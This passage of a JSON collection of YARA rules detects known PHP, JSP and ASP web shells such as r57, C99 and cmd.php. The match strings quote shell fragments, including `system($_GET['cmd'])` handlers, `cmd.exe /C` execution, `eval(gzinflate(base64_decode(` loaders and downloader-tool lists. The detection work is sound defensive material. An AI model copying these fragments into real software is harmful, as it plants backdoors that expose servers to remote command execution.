https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"public JythonShell(int columns, int rows, int scrollback) {\" fullword\n      $s9 = \"this(null, Py.getSystemState(), columns, rows, scrollback);\" fullword\n   condition: \n      1 of them\n}","date":"2014-01-28 11:17:01","description":"Web Shell - file Java Shell.jsp","minimum_yara":"1.7","name":"Webshell_Java_Shell_RID2E7F","reference":"-","required_modules":[],"rule_hash":"6ad1bd34e7c2e9eccc10528542508d61","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_asp_1d_RID2CDE : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 1d.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:07:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"+9JkskOfKhUxZJPL~\\\\(mD^W~[,{@#@&EO\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:07:31","description":"Web Shell - file 1d.asp","minimum_yara":"1.7","name":"Webshell_asp_1d_RID2CDE","reference":"-","required_modules":[],"rule_hash":"d8bac65c652fe36463fbbc3cbe913af5","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_IXRbE_RID2DEC : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file IXRbE.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:52:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%if(request.getParameter(\\\"f\\\")!=null)(new java.io.FileOutputStream(application\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:52:31","description":"Web Shell - file IXRbE.jsp","minimum_yara":"1.7","name":"Webshell_jsp_IXRbE_RID2DEC","reference":"-","required_modules":[],"rule_hash":"f516f2b5bacd8c4019333b916386f950","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_G5_RID2C69 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file G5.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 09:48:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"echo \\\"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op\" \n   condition: \n      all of them\n}","date":"2014-01-28 09:48:01","description":"Web Shell - file G5.php","minimum_yara":"1.7","name":"Webshell_PHP_G5_RID2C69","reference":"-","required_modules":[],"rule_hash":"e693b363792cd0c35ad7dd0a67b7fe84","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_r57142_RID2D62 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file r57142.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:29:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 10:29:31","description":"Web Shell - file r57142.php","minimum_yara":"1.7","name":"Webshell_PHP_r57142_RID2D62","reference":"-","required_modules":[],"rule_hash":"285877c89bdf6d3edd5b2ebc77dade02","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_tree_RID2E02 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file tree.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:56:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"$('#tt2').tree('options').url = \\\"selectChild.action?checki\" \n      $s6 = \"String basePath = request.getScheme()+\\\"://\\\"+request.getServerName()+\\\":\\\"+requ\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:56:11","description":"Web Shell - file tree.jsp","minimum_yara":"1.7","name":"Webshell_jsp_tree_RID2E02","reference":"-","required_modules":[],"rule_hash":"bb82e50b67c70b0d8ee356f505b75f42","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_C99madShell_v_3_0_smowu_RID3315 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file smowu.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:32:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"<tr><td width=\\\"50%\\\" height=\\\"1\\\" valign=\\\"top\\\"><center><b>:: Enter ::</b><for\" \n      $s8 = \"<p><font color=red>Wordpress Not Found! <input type=text id=\\\"wp_pat\\\"><input ty\" \n   condition: \n      1 of them\n}","date":"2014-01-28 14:32:41","description":"Web Shell - file smowu.php","minimum_yara":"1.7","name":"Webshell_C99madShell_v_3_0_smowu_RID3315","reference":"-","required_modules":[],"rule_hash":"36a1c4c9dcdc61d88733fa690c5d5f86","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_simple_backdoor_RID30D4 : DEMO MAL T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file simple-backdoor.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:56:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$cmd = ($_REQUEST['cmd']);\" fullword\n      $s1 = \"if(isset($_REQUEST['cmd'])){\" fullword\n      $s4 = \"system($cmd);\" fullword\n   condition: \n      2 of them\n}","date":"2014-01-28 12:56:31","description":"Web Shell - file simple-backdoor.php","minimum_yara":"1.7","name":"Webshell_simple_backdoor_RID30D4","reference":"-","required_modules":[],"rule_hash":"443e5ddd23466685eff2e9a9ac75e2ab","score":70,"tags":["T1100","DEMO","WEBSHELL","MAL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_404_b_RID2D46 : DEMO T1087 T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 404.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:24:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1087, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"<span>Posix_getpwuid (\\\"Read\\\" /etc/passwd)\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:24:51","description":"Web Shell - file 404.php","minimum_yara":"1.7","name":"Webshell_PHP_404_b_RID2D46","reference":"-","required_modules":[],"rule_hash":"9eff1facd3c52a4ee0992b75805dc6e2","score":70,"tags":["T1100","DEMO","WEBSHELL","T1087"]},{"author":"Florian Roth","content":"rule Webshell_Antichat_Shell_v1_3_2_RID3252 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Antichat Shell v1.3.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:00:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"$header='<html><head><title>'.getenv(\\\"HTTP_HOST\\\").' - Antichat Shell</title><m\" \n   condition: \n      all of them\n}","date":"2014-01-28 14:00:11","description":"Web Shell - file Antichat Shell v1.3.php","minimum_yara":"1.7","name":"Webshell_Antichat_Shell_v1_3_2_RID3252","reference":"-","required_modules":[],"rule_hash":"191d47fda801e1416dbe8fd1236215e1","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Safe_mode_breaker_RID3164 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Safe mode breaker.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:20:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"preg_match(\\\"/SAFE\\\\ MODE\\\\ Restriction\\\\ in\\\\ effect\\\\..*whose\\\\ uid\\\\ is(\" \n      $s6 = \"$path =\\\"{$root}\\\".((substr($root,-1)!=\\\"/\\\") ? \\\"/\\\" : NULL).\" \n   condition: \n      1 of them\n}","date":"2014-01-28 13:20:31","description":"Web Shell - file Safe mode breaker.php","minimum_yara":"1.7","name":"Webshell_Safe_mode_breaker_RID3164","reference":"-","required_modules":[],"rule_hash":"8177dc10eac6c2c8b4223cedf869e917","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Sst_Sheller_RID2F0E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Sst-Sheller.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:40:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"echo \\\"<a href='?page=filemanager&id=fm&fchmod=$dir$file'>\" \n      $s3 = \"<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3)\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:40:51","description":"Web Shell - file Sst-Sheller.php","minimum_yara":"1.7","name":"Webshell_Sst_Sheller_RID2F0E","reference":"-","required_modules":[],"rule_hash":"f58d3009c1cf544c6be25b77de12347c","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_list_RID2E0E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file list.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:58:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<FORM METHOD=\\\"POST\\\" NAME=\\\"myform\\\" ACTION=\\\"\\\">\" fullword\n      $s2 = \"out.print(\\\") <A Style='Color: \\\" + fcolor.toString() + \\\";' HRef='?file=\\\" + fn\" \n      $s7 = \"if(flist[i].canRead() == true) out.print(\\\"r\\\" ); else out.print(\\\"-\\\");\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 10:58:11","description":"Web Shell - file list.jsp","minimum_yara":"1.7","name":"Webshell_jsp_list_RID2E0E","reference":"-","required_modules":[],"rule_hash":"bca3207eb23475012bac1d1397b0478e","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHPJackal_v1_5_RID2F6E : DEMO MIDDLE_EAST T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file PHPJackal v1.5.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:56:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MIDDLE_EAST, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"echo \\\"<center>${t}MySQL cilent:</td><td bgcolor=\\\\\\\"#333333\\\\\\\"></td></tr><form\" \n      $s8 = \"echo \\\"<center>${t}Wordlist generator:</td><td bgcolor=\\\\\\\"#333333\\\\\\\"></td></tr\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:56:51","description":"Web Shell - file PHPJackal v1.5.php","minimum_yara":"1.7","name":"Webshell_PHPJackal_v1_5_RID2F6E","reference":"-","required_modules":[],"rule_hash":"f63f52e45dcbabb3463ff5d1535e2dcb","score":70,"tags":["T1100","DEMO","WEBSHELL","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule Webshell_customize_RID2E89 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file customize.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:18:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"String cs = request.getParameter(\\\"z0\\\")==null?\\\"gbk\\\": request.getParameter(\\\"z\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:18:41","description":"Web Shell - file customize.jsp","minimum_yara":"1.7","name":"Webshell_customize_RID2E89","reference":"-","required_modules":[],"rule_hash":"b81930efa29ca2c6a52b452f87bdf1ca","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_s72_Shell_v1_1_Coding_RID3222 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file s72 Shell v1.1 Coding.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:52:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"<font face=\\\"Verdana\\\" style=\\\"font-size: 8pt\\\" color=\\\"#800080\\\">Buradan Dosya \" \n   condition: \n      all of them\n}","date":"2014-01-28 13:52:11","description":"Web Shell - file s72 Shell v1.1 Coding.php","minimum_yara":"1.7","name":"Webshell_s72_Shell_v1_1_Coding_RID3222","reference":"-","required_modules":[],"rule_hash":"98f7048dd4fc3215ce0d9c1389ec093e","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_sys3_RID2DE4 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file sys3.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:51:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<input type=\\\"submit\\\" name=\\\"btnSubmit\\\" value=\\\"Upload\\\">\" fullword\n      $s4 = \"String path=new String(request.getParameter(\\\"path\\\").getBytes(\\\"ISO-8859-1\\\"\" \n      $s9 = \"<%@page contentType=\\\"text/html;charset=gb2312\\\"%>\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 10:51:11","description":"Web Shell - file sys3.jsp","minimum_yara":"1.7","name":"Webshell_jsp_sys3_RID2DE4","reference":"-","required_modules":[],"rule_hash":"fc4de385d07bed499e80756cb988f55e","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_guige02_RID2EC5 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file guige02.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:28:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\\\"#fff\" \n      $s1 = \"<%@page contentType=\\\"text/html; charset=GBK\\\" import=\\\"java.io.*;\\\"%><%!private\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:28:41","description":"Web Shell - file guige02.jsp","minimum_yara":"1.7","name":"Webshell_jsp_guige02_RID2EC5","reference":"-","required_modules":[],"rule_hash":"46c297fe343f653124581551f2c31428","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_php_ghost_RID2E72 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file ghost.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:14:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64'\" \n      $s6 = \"//<img width=1 height=1 src=\\\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***\" \n      $s7 = \"preg_replace('\\\\'a\\\\'eis','e'.'v'.'a'.'l'.'(KmU(\\\"\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 11:14:51","description":"Web Shell - file ghost.php","minimum_yara":"1.7","name":"Webshell_php_ghost_RID2E72","reference":"-","required_modules":[],"rule_hash":"bcfeea855c47fa7cfa78e41971e517c7","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_WinX_Shell_RID2E83 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file WinX Shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:17:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"print \\\"<font face=\\\\\\\"Verdana\\\\\\\" size=\\\\\\\"1\\\\\\\" color=\\\\\\\"#990000\\\\\\\">Filenam\" \n      $s8 = \"print \\\"<font face=\\\\\\\"Verdana\\\\\\\" size=\\\\\\\"1\\\\\\\" color=\\\\\\\"#990000\\\\\\\">File: </\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:17:41","description":"Web Shell - file WinX Shell.php","minimum_yara":"1.7","name":"Webshell_WinX_Shell_RID2E83","reference":"-","required_modules":[],"rule_hash":"198d62118c8164c87c32476ba9772efd","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Crystal_Crystal_RID30C9 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Crystal.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:54:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"show opened ports</option></select><input type=\\\"hidden\\\" name=\\\"cmd_txt\\\" value\" \n      $s6 = \"\\\" href=\\\"?act=tools\\\"><font color=#CC0000 size=\\\"3\\\">Tools</font></a></span></f\" \n   condition: \n      all of them\n}","date":"2014-01-28 12:54:41","description":"Web Shell - file Crystal.php","minimum_yara":"1.7","name":"Webshell_Crystal_Crystal_RID30C9","reference":"-","required_modules":[],"rule_hash":"1ee75519da607047b5a8770250cf7799","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_r57_1_4_0_RID2D36 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file r57.1.4.0.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:22:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"@ini_set('error_log',NULL);\" fullword\n      $s6 = \"$pass='abcdef1234567890abcdef1234567890';\" fullword\n      $s7 = \"@ini_restore(\\\"disable_functions\\\");\" fullword\n      $s9 = \"@ini_restore(\\\"safe_mode_exec_dir\\\");\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 10:22:11","description":"Web Shell - file r57.1.4.0.php","minimum_yara":"1.7","name":"Webshell_r57_1_4_0_RID2D36","reference":"-","required_modules":[],"rule_hash":"22d09d5a1bc89be64d86fc77fe76ae25","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_asp_ajn_RID2D82 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file ajn.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:34:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"seal.write \\\"Set WshShell = CreateObject(\\\"\\\"WScript.Shell\\\"\\\")\\\" & vbcrlf\" fullword\n      $s6 = \"seal.write \\\"BinaryStream.SaveToFile \\\"\\\"c:\\\\downloaded.zip\\\"\\\", adSaveCreateOve\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:34:51","description":"Web Shell - file ajn.asp","minimum_yara":"1.7","name":"Webshell_asp_ajn_RID2D82","reference":"-","required_modules":[],"rule_hash":"3f0ab52e3b126bff37e5042080690af0","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_php_cmd_RID2D81 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmd.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:34:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if($_GET['cmd']) {\" fullword\n      $s1 = \"// cmd.php = Command Execution\" fullword\n      $s7 = \"  system($_GET['cmd']);\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 10:34:41","description":"Web Shell - file cmd.php","minimum_yara":"1.7","name":"Webshell_php_cmd_RID2D81","reference":"-","required_modules":[],"rule_hash":"a23ec9bcae34d60ddcdf109ef793a728","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_asp_list_RID2E05 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file list.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:56:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<INPUT TYPE=\\\"hidden\\\" NAME=\\\"type\\\" value=\\\"<%=tipo%>\\\">\" fullword\n      $s4 = \"Response.Write(\\\"<h3>FILE: \\\" & file & \\\"</h3>\\\")\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 10:56:41","description":"Web Shell - file list.asp","minimum_yara":"1.7","name":"Webshell_asp_list_RID2E05","reference":"-","required_modules":[],"rule_hash":"0878d931645b87ccc6594e75cace0d23","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_co_RID2CBF : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file co.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:02:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"cGX6R9q733WvRRjISKHOp9neT7wa6ZAD8uthmVJV\" fullword\n      $s11 = \"6Mk36lz/HOkFfoXX87MpPhZzBQH6OaYukNg1OE1j\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 10:02:21","description":"Web Shell - file co.php","minimum_yara":"1.7","name":"Webshell_PHP_co_RID2CBF","reference":"-","required_modules":[],"rule_hash":"acdd1d6b9559a57281814d3630bf48bf","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_150_RID2C83 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 150.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 09:52:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"HJ3HjqxclkZfp\" \n      $s1 = \"<? eval(gzinflate(base64_decode('\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 09:52:21","description":"Web Shell - file 150.php","minimum_yara":"1.7","name":"Webshell_PHP_150_RID2C83","reference":"-","required_modules":[],"rule_hash":"adf584f9270838b287081062c22c39c0","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_cmdjsp_2_RID2F64 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmdjsp.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:55:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Process p = Runtime.getRuntime().exec(\\\"cmd.exe /C \\\" + cmd);\" fullword\n      $s4 = \"<FORM METHOD=GET ACTION='cmdjsp.jsp'>\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 11:55:11","description":"Web Shell - file cmdjsp.jsp","minimum_yara":"1.7","name":"Webshell_jsp_cmdjsp_2_RID2F64","reference":"-","required_modules":[],"rule_hash":"3fe3f584e712db6653e980b90f8c1cb8","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_c37_RID2CBA : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file c37.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:01:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj'),\" \n      $s9 = \"++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE],\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:01:31","description":"Web Shell - file c37.php","minimum_yara":"1.7","name":"Webshell_PHP_c37_RID2CBA","reference":"-","required_modules":[],"rule_hash":"7e835561088f94d1628a1125585d5d7d","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_b37_RID2CB9 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file b37.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:01:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"xmg2/G4MZ7KpNveRaLgOJvBcqa2A8/sKWp9W93NLXpTTUgRc\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:01:21","description":"Web Shell - file b37.php","minimum_yara":"1.7","name":"Webshell_PHP_b37_RID2CB9","reference":"-","required_modules":[],"rule_hash":"183a7b6ad4b1167e670e5d6650fdd62f","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_php_backdoor_RID2F92 : DEMO MAL T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file php-backdoor.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:02:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, T1100, WEBSHELL\"\n      